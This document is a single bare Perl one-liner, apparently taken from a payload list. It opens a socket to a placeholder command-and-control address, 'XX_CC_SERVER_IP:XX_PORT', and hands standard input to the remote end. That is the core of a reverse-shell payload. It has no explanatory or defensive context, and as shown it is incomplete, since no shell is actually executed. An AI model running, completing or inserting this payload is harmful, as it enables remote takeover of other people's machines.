perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"XX_CC_SERVER_IP:XX_PORT");STDIN->fdopen($c,r);'
